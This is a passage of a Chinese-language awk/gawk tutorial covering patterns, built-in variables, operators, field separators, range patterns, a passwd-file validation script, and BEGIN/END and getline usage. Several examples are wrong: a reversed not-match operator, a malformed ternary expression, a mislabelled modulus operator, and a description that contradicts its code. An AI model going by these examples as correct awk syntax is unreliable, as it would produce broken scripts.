&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-W version or --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印bug报告信息的版本。&lt;/p&gt;
&lt;h2 id=&quot;3-模式和操作&quot;&gt;&lt;a href=&quot;#3-模式和操作&quot; class=&quot;headerlink&quot; title=&quot;3. 模式和操作&quot;&gt;&lt;/a&gt;3. 模式和操作&lt;/h2&gt;&lt;p&gt;awk脚本是由模式和操作组成的：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pattern {action}&lt;/code&gt; 如&lt;code&gt;$ awk &amp;#39;/root/&amp;#39; test&lt;/code&gt;，或&lt;code&gt;$ awk &amp;#39;$3 &amp;amp;lt; 100&amp;#39; test&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;两者是可选的，如果没有模式，则action应用到全部记录，如果没有action，则输出匹配全部记录。默认情况下，每一个输入行都是一条记录，但用户可通过RS变量指定不同的分隔符进行分隔。&lt;/p&gt;
&lt;h3 id=&quot;3-1-模式&quot;&gt;&lt;a href=&quot;#3-1-模式&quot; class=&quot;headerlink&quot; title=&quot;3.1. 模式&quot;&gt;&lt;/a&gt;3.1. 模式&lt;/h3&gt;&lt;p&gt;模式可以是以下任意一个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;/正则表达式/：使用通配符的扩展集。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关系表达式：可以用下面运算符表中的关系运算符进行操作，可以是字符串或数字的比较，如$2&amp;gt;%1选择第二个字段比第一个字段长的行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;模式匹配表达式：用运算符~(匹配)和~!(不匹配)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;模式，模式：指定一个行的范围。该语法不能包括BEGIN和END模式。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;BEGIN：让用户指定在第一条输入记录被处理之前所发生的动作，通常可在这里设置全局变量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;END：让用户在最后一条输入记录被读取之后发生的动作。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;3-2-操作&quot;&gt;&lt;a href=&quot;#3-2-操作&quot; class=&quot;headerlink&quot; title=&quot;3.2. 操作&quot;&gt;&lt;/a&gt;3.2. 操作&lt;/h3&gt;&lt;p&gt;操作由一人或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内。主要有四部份：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;变量或数组赋值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;输出命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;内置函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;控制流命令&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;4-awk的环境变量&quot;&gt;&lt;a href=&quot;#4-awk的环境变量&quot; class=&quot;headerlink&quot; title=&quot;4. awk的环境变量&quot;&gt;&lt;/a&gt;4. awk的环境变量&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Table 1. awk的环境变量&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;变量&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;$n&lt;/td&gt;
&lt;td&gt;当前记录的第n个字段，字段间由FS分隔。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$0&lt;/td&gt;
&lt;td&gt;完整的输入记录。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ARGC&lt;/td&gt;
&lt;td&gt;命令行参数的数目。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ARGIND&lt;/td&gt;
&lt;td&gt;命令行中当前文件的位置(从0开始算)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ARGV&lt;/td&gt;
&lt;td&gt;包含命令行参数的数组。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CONVFMT&lt;/td&gt;
&lt;td&gt;数字转换格式(默认值为%.6g)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ENVIRON&lt;/td&gt;
&lt;td&gt;环境变量关联数组。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ERRNO&lt;/td&gt;
&lt;td&gt;最后一个系统错误的描述。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FIELDWIDTHS&lt;/td&gt;
&lt;td&gt;字段宽度列表(用空格键分隔)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FILENAME&lt;/td&gt;
&lt;td&gt;当前文件名。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FNR&lt;/td&gt;
&lt;td&gt;同NR，但相对于当前文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FS&lt;/td&gt;
&lt;td&gt;字段分隔符(默认是任何空格)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IGNORECASE&lt;/td&gt;
&lt;td&gt;如果为真，则进行忽略大小写的匹配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NF&lt;/td&gt;
&lt;td&gt;当前记录中的字段数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NR&lt;/td&gt;
&lt;td&gt;当前记录数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OFMT&lt;/td&gt;
&lt;td&gt;数字的输出格式(默认值是%.6g)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OFS&lt;/td&gt;
&lt;td&gt;输出字段分隔符(默认值是一个空格)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ORS&lt;/td&gt;
&lt;td&gt;输出记录分隔符(默认值是一个换行符)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RLENGTH&lt;/td&gt;
&lt;td&gt;由match函数所匹配的字符串的长度。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RS&lt;/td&gt;
&lt;td&gt;记录分隔符(默认是一个换行符)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RSTART&lt;/td&gt;
&lt;td&gt;由match函数所匹配的字符串的第一个位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SUBSEP&lt;/td&gt;
&lt;td&gt;数组下标分隔符(默认值是\034)。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;5-awk运算符&quot;&gt;&lt;a href=&quot;#5-awk运算符&quot; class=&quot;headerlink&quot; title=&quot;5. awk运算符&quot;&gt;&lt;/a&gt;5. awk运算符&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Table 2. 运算符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;运算符&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;= += -= &lt;em&gt;= /= %= ^= \&lt;/em&gt;*=&lt;/td&gt;
&lt;td&gt;赋值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;:&lt;/td&gt;
&lt;td&gt;C条件表达式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;#124;&amp;#124;&lt;/td&gt;
&lt;td&gt;逻辑或&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
&lt;td&gt;逻辑与&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;~ ~!&lt;/td&gt;
&lt;td&gt;匹配正则表达式和不匹配正则表达式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; &amp;lt;= &amp;gt; &amp;gt;= != ==&lt;/td&gt;
&lt;td&gt;关系运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;空格&lt;/td&gt;
&lt;td&gt;连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+ -&lt;/td&gt;
&lt;td&gt;加，减&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;* / &amp;amp;&lt;/td&gt;
&lt;td&gt;乘，除与求余&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+ - !&lt;/td&gt;
&lt;td&gt;一元加，减和逻辑非&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;^ ***&lt;/td&gt;
&lt;td&gt;求幂&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;++ –&lt;/td&gt;
&lt;td&gt;增加或减少，作为前缀或后缀&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$&lt;/td&gt;
&lt;td&gt;字段引用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;in&lt;/td&gt;
&lt;td&gt;数组成员&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;6-记录和域&quot;&gt;&lt;a href=&quot;#6-记录和域&quot; class=&quot;headerlink&quot; title=&quot;6. 记录和域&quot;&gt;&lt;/a&gt;6. 记录和域&lt;/h2&gt;&lt;h3 id=&quot;6-1-记录&quot;&gt;&lt;a href=&quot;#6-1-记录&quot; class=&quot;headerlink&quot; title=&quot;6.1. 记录&quot;&gt;&lt;/a&gt;6.1. 记录&lt;/h3&gt;&lt;p&gt;awk把每一个以换行符结束的行称为一个记录。&lt;/p&gt;
&lt;p&gt;记录分隔符：默认的输入和输出的分隔符都是回车，保存在内建变量ORS和RS中。&lt;/p&gt;
&lt;p&gt;$0变量：它指的是整条记录。如&lt;code&gt;$ awk &amp;#39;{print $0}&amp;#39; test&lt;/code&gt;将输出test文件中的所有记录。&lt;/p&gt;
&lt;p&gt;变量NR：一个计数器，每处理完一条记录，NR的值就增加1。如$ awk ‘{print NR,$0}’ test将输出test文件中所有记录，并在记录前显示记录号。&lt;/p&gt;
&lt;h3 id=&quot;6-2-域&quot;&gt;&lt;a href=&quot;#6-2-域&quot; class=&quot;headerlink&quot; title=&quot;6.2. 域&quot;&gt;&lt;/a&gt;6.2. 域&lt;/h3&gt;&lt;p&gt;记录中每个单词称做“域”，默认情况下以空格或tab分隔。awk可跟踪域的个数，并在内建变量NF中保存该值。如&lt;code&gt;$ awk &amp;#39;{print $1,$3}&amp;#39;&lt;/code&gt; test将打印test文件中第一和第三个以空格分开的列(域)。&lt;/p&gt;
&lt;h3 id=&quot;6-3-域分隔符&quot;&gt;&lt;a href=&quot;#6-3-域分隔符&quot; class=&quot;headerlink&quot; title=&quot;6.3. 域分隔符&quot;&gt;&lt;/a&gt;6.3. 域分隔符&lt;/h3&gt;&lt;p&gt;内建变量FS保存输入域分隔符的值，默认是空格或tab。我们可以通过-F命令行选项修改FS的值。如&lt;code&gt;$ awk -F: &amp;#39;{print $1,$5}&amp;#39; test&lt;/code&gt;将打印以冒号为分隔符的第一，第五列的内容。&lt;/p&gt;
&lt;p&gt;可以同时使用多个域分隔符，这时应该把分隔符写成放到方括号中，如&lt;code&gt;$awk -F&amp;#39;[:\t]&amp;#39; &amp;#39;{print $1,$3}&amp;#39; test&lt;/code&gt;，表示以空格、冒号和tab作为分隔符。&lt;/p&gt;
&lt;p&gt;输出域的分隔符默认是一个空格，保存在OFS中。如&lt;code&gt;$ awk -F: &amp;#39;{print $1,$5}&amp;#39; test&lt;/code&gt;，$1和$5间的逗号就是OFS的值。&lt;/p&gt;
&lt;h2 id=&quot;7-gawk专用正则表达式元字符&quot;&gt;&lt;a href=&quot;#7-gawk专用正则表达式元字符&quot; class=&quot;headerlink&quot; title=&quot;7. gawk专用正则表达式元字符&quot;&gt;&lt;/a&gt;7. gawk专用正则表达式元字符&lt;/h2&gt;&lt;p&gt;一般通用的元字符集就不讲了，可参考我的&lt;a href=&quot;http://www.ringkee.com/jims/technic_folder/sed.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sed&lt;/a&gt;和&lt;a href=&quot;http://www.ringkee.com/jims/technic_floder/grep.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Grep&lt;/a&gt;学习笔记。以下几个是gawk专用的，不适合unix版本的awk。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;\Y 匹配一个单词开头或者末尾的空字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\B 匹配单词内的空字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\&amp;lt; 匹配一个单词的开头的空字符串，锚定开始。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\&amp;gt; 匹配一个单词的末尾的空字符串，锚定末尾。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\w 匹配一个字母数字组成的单词。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\W 匹配一个非字母数字组成的单词。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\‘ 匹配字符串开头的一个空字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\&amp;apos; 匹配字符串末尾的一个空字符串。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;8-POSIX字符集&quot;&gt;&lt;a href=&quot;#8-POSIX字符集&quot; class=&quot;headerlink&quot; title=&quot;8. POSIX字符集&quot;&gt;&lt;/a&gt;8. POSIX字符集&lt;/h2&gt;&lt;p&gt;可参考我的&lt;a href=&quot;http://www.ringkee.com/jims/technic_folder/grep.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Grep学习笔记&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;9-匹配操作符&quot;&gt;&lt;a href=&quot;#9-匹配操作符&quot; class=&quot;headerlink&quot; title=&quot;9. 匹配操作符(~)&quot;&gt;&lt;/a&gt;9. 匹配操作符(~)&lt;/h2&gt;&lt;p&gt;用来在记录或者域内匹配正则表达式。如&lt;code&gt;$ awk &amp;#39;$1 ~/^root/&amp;#39; test&lt;/code&gt;将显示test文件第一列中以root开头的行。&lt;/p&gt;
&lt;h2 id=&quot;10-比较表达式&quot;&gt;&lt;a href=&quot;#10-比较表达式&quot; class=&quot;headerlink&quot; title=&quot;10. 比较表达式&quot;&gt;&lt;/a&gt;10. 比较表达式&lt;/h2&gt;&lt;p&gt;&lt;code&gt;conditional expression1 expression2: expression3&lt;/code&gt;，例如：&lt;code&gt;$ awk &amp;#39;{max = {$1 &amp;amp;gt; $3} $1: $3: print max}&amp;#39; test&lt;/code&gt;。如果第一个域大于第三个域，$1就赋值给max，否则$3就赋值给max。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;$1 + $2 &amp;amp;lt; 100&amp;#39; test&lt;/code&gt;。如果第一和第二个域相加大于100，则打印这些行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;$1 &amp;amp;gt; 5 &amp;amp;&amp;amp; $2 &amp;amp;lt; 10&amp;#39; test&lt;/code&gt;,如果第一个域大于5，并且第二个域小于10，则打印这些行。&lt;/p&gt;
&lt;h2 id=&quot;11-范围模板&quot;&gt;&lt;a href=&quot;#11-范围模板&quot; class=&quot;headerlink&quot; title=&quot;11. 范围模板&quot;&gt;&lt;/a&gt;11. 范围模板&lt;/h2&gt;&lt;p&gt;范围模板匹配从第一个模板的第一次出现到第二个模板的第一次出现之间所有行。如果有一个模板没出现，则匹配到开头或末尾。如&lt;code&gt;$ awk &amp;#39;/root/,/mysql/&amp;#39; test&lt;/code&gt;将显示root第一次出现到mysql第一次出现之间的所有行。&lt;/p&gt;
&lt;h2 id=&quot;12-一个验证passwd文件有效性的例子&quot;&gt;&lt;a href=&quot;#12-一个验证passwd文件有效性的例子&quot; class=&quot;headerlink&quot; title=&quot;12. 一个验证passwd文件有效性的例子&quot;&gt;&lt;/a&gt;12. 一个验证passwd文件有效性的例子&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ cat /etc/passwd | awk -F: &amp;apos;\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NF != 7&amp;#123;\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;printf(&amp;quot;line %d,does not have 7 fields:%s\n&amp;quot;,NR,$0)&amp;#125;\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$1 !~ /[A-Za-z0-9]/&amp;#123;printf(&amp;quot;line %d,non alpha and numeric user id:%d: %s\n,NR,$0)&amp;#125;\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$2 == &amp;quot;*&amp;quot; &amp;#123;printf(&amp;quot;line %d, no password: %s\n&amp;quot;,NR,$0)&amp;#125;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#co.1&quot;&gt;&lt;img src=&quot;images/callouts/1.png&quot; alt=&quot;1&quot;&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;cat把结果输出给awk，awk把域之间的分隔符设为冒号。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#co.2&quot;&gt;&lt;img src=&quot;images/callouts/2.png&quot; alt=&quot;2&quot;&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;如果域的数量(NF)不等于7，就执行下面的程序。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#co.3&quot;&gt;&lt;img src=&quot;images/callouts/3.png&quot; alt=&quot;3&quot;&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;printf打印字符串”line does not have 7 fields”，并显示该条记录。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#co.4&quot;&gt;&lt;img src=&quot;images/callouts/4.png&quot; alt=&quot;4&quot;&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;如果第一个域没有包含任何字母和数字，printf打印“no alpha and numeric user id” ，并显示记录数和记录。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#co.5&quot;&gt;&lt;img src=&quot;images/callouts/5.png&quot; alt=&quot;5&quot;&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;如果第二个域是一个星号，就打印字符串“no passwd”，紧跟着显示记录数和记录本身。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;13-几个实例&quot;&gt;&lt;a href=&quot;#13-几个实例&quot; class=&quot;headerlink&quot; title=&quot;13. 几个实例&quot;&gt;&lt;/a&gt;13. 几个实例&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;/^(no|so)/&amp;#39; test&lt;/code&gt;—–打印所有以模式no或so开头的行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;/^[ns]/{print $1}&amp;#39; test&lt;/code&gt;—–如果记录以n或s开头，就打印这个记录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;$1 ~/[0-9][0-9]$/(print $1}&amp;#39; test&lt;/code&gt;—–如果第一个域以两个数字结束就打印这个记录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;$1 == 100 || $2 &amp;amp;lt; 50&amp;#39; test&lt;/code&gt;—–如果第一个或等于100或者第二个域小于50，则打印该行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;$1 != 10&amp;#39; test&lt;/code&gt;—–如果第一个域不等于10就打印该行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;/test/{print $1 + 10}&amp;#39; test&lt;/code&gt;—–如果记录包含正则表达式test，则第一个域加10并打印出来。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;{print ($1 &amp;amp;gt; 5 &amp;quot;ok &amp;quot;$1: &amp;quot;error&amp;quot;$1)}&amp;#39; test&lt;/code&gt;—–如果第一个域大于5则打印问号后面的表达式值，否则打印冒号后面的表达式值。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ awk &amp;#39;/^root/,/^mysql/&amp;#39; test&lt;/code&gt;—-打印以正则表达式root开头的记录到以正则表达式mysql开头的记录范围内的所有记录。如果找到一个新的正则表达式root开头的记录，则继续打印直到下一个以正则表达式mysql开头的记录为止，或到文件末尾。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;14-awk编程&quot;&gt;&lt;a href=&quot;#14-awk编程&quot; class=&quot;headerlink&quot; title=&quot;14. awk编程&quot;&gt;&lt;/a&gt;14. awk编程&lt;/h2&gt;&lt;h3 id=&quot;14-1-变量&quot;&gt;&lt;a href=&quot;#14-1-变量&quot; class=&quot;headerlink&quot; title=&quot;14.1. 变量&quot;&gt;&lt;/a&gt;14.1. 变量&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在awk中，变量不需要定义就可以直接使用，变量类型可以是数字或字符串。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;赋值格式：&lt;code&gt;Variable = expression&lt;/code&gt;，如&lt;code&gt;$ awk &amp;#39;$1 ~/test/{count = $2 + $3; print count}&amp;#39; test&lt;/code&gt;,上式的作用是,awk先扫描第一个域，一旦test匹配，就把第二个域的值加上第三个域的值，并把结果赋值给变量count，最后打印出来。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;awk可以在命令行中给变量赋值，然后将这个变量传输给awk脚本。如&lt;code&gt;$ awk -F: -f awkscript month=4 year=2004 test&lt;/code&gt;，上式的month和year都是自定义变量，分别被赋值为4和2004。在awk脚本中，这些变量使用起来就象是在脚本中建立的一样。注意，如果参数前面出现test，那么在BEGIN语句中的变量就不能被使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;域变量也可被赋值和修改，如&lt;code&gt;$ awk &amp;#39;{$2 = 100 + $1; print }&amp;#39; test&lt;/code&gt;,上式表示，如果第二个域不存在，awk将计算表达式100加$1的值，并将其赋值给$2，如果第二个域存在，则用表达式的值覆盖$2原来的值。再例如：&lt;code&gt;$ awk &amp;#39;$1 == &amp;quot;root&amp;quot;{$1 =&amp;quot;test&amp;quot;;print}&amp;#39; test&lt;/code&gt;，如果第一个域的值是“root”，则把它赋值为“test”，注意，字符串一定要用双引号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;内建变量的使用。变量列表在前面已列出，现在举个例子说明一下。&lt;code&gt;$ awk -F: &amp;#39;{IGNORECASE=1; $1 == &amp;quot;MARY&amp;quot;{print NR,$1,$2,$NF}&amp;#39;test&lt;/code&gt;，把IGNORECASE设为1代表忽略大小写，打印第一个域是mary的记录数、第一个域、第二个域和最后一个域。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;14-2-BEGIN模块&quot;&gt;&lt;a href=&quot;#14-2-BEGIN模块&quot; class=&quot;headerlink&quot; title=&quot;14.2. BEGIN模块&quot;&gt;&lt;/a&gt;14.2. BEGIN模块&lt;/h3&gt;&lt;p&gt;BEGIN模块后紧跟着动作块，这个动作块在awk处理任何输入文件之前执行。所以它可以在没有任何输入的情况下进行测试。它通常用来改变内建变量的值，如OFS,RS和FS等，以及打印标题。如：&lt;code&gt;$ awk &amp;#39;BEGIN{FS=&amp;quot;:&amp;quot;; OFS=&amp;quot;\t&amp;quot;; ORS=&amp;quot;\n\n&amp;quot;}{print $1,$2,$3} test&lt;/code&gt;。上式表示，在处理输入文件以前，域分隔符(FS)被设为冒号，输出文件分隔符(OFS)被设置为制表符，输出记录分隔符(ORS)被设置为两个换行符。&lt;code&gt;$ awk &amp;#39;BEGIN{print &amp;quot;TITLE TEST&amp;quot;}&lt;/code&gt;只打印标题。&lt;/p&gt;
&lt;h3 id=&quot;14-3-END模块&quot;&gt;&lt;a href=&quot;#14-3-END模块&quot; class=&quot;headerlink&quot; title=&quot;14.3. END模块&quot;&gt;&lt;/a&gt;14.3. END模块&lt;/h3&gt;&lt;p&gt;END不匹配任何的输入文件，但是执行动作块中的所有动作，它在整个输入文件处理完成后被执行。如&lt;code&gt;$ awk &amp;#39;END{print &amp;quot;The number of records is&amp;quot; NR}&amp;#39; test&lt;/code&gt;，上式将打印所有被处理的记录数。&lt;/p&gt;
&lt;h3 id=&quot;14-4-重定向和管道&quot;&gt;&lt;a href=&quot;#14-4-重定向和管道&quot; class=&quot;headerlink&quot; title=&quot;14.4. 重定向和管道&quot;&gt;&lt;/a&gt;14.4. 重定向和管道&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;awk可使用shell的重定向符进行重定向输出，如：&lt;code&gt;$ awk &amp;#39;$1 = 100 {print $1 &amp;amp;gt; &amp;quot;output_file&amp;quot; }&amp;#39; test&lt;/code&gt;。上式表示如果第一个域的值等于100，则把它输出到output_file中。也可以用&amp;gt;&amp;gt;来重定向输出，但不清空文件，只做追加操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;输出重定向需用到getline函数。getline从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容，并给NF,NR和FNR等内建变量赋值。如果得到一条记录，getline函数返回1，如果到达文件的末尾就返回0，如果出现错误，例如打开文件失败，就返回-1。如：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ awk &amp;#39;BEGIN{ &amp;quot;date&amp;quot; | getline d; print d}&amp;#39; test&lt;/code&gt;。执行linux的date命令，并通过管道输出给getline，然后再把输出赋值给自定义变量d，并打印它。&lt;/p&gt;
